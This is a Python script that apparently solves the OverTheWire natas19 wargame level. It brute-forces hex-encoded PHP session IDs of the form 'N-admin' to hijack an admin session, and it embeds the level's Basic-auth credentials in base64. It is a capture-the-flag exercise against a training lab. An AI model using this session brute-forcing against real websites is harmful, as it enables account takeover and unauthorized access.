import requests
import binascii
import logging

debug = False
if debug is True:
    try:
        import http.client as http_client
    except ImportError:
        import httplib as http_client
    http_client.HTTPConnection.debuglevel = 1

    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    r_log = logging.getLogger("requests.packages.urllib3")
    r_log.setLevel(logging.DEBUG)
    r_log.propagate = True


print("Trying to bruteforce session id to find admin session")
url = 'http://natas19.natas.labs.overthewire.org/index.php'
login = { 'username':'admin', 'password':'admin'}
print("Session id: ",end='')
for i in range(999):
    b = str(i) + "-admin"
    hexstr = str(binascii.hexlify(b.encode()).decode())
    header = { 'Authorization':'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' }
    cookie = dict(PHPSESSID=hexstr)
    print("{0}..".format(str(i)),end='',flush=True)
    r = requests.get(url, params=login, headers=header, cookies=cookie)
    if 'You are logged in as a regular user' not in r.text:
        print("Admin session found {0}".format(str(i)))
        print(r.text)
        break

print("Success???")
    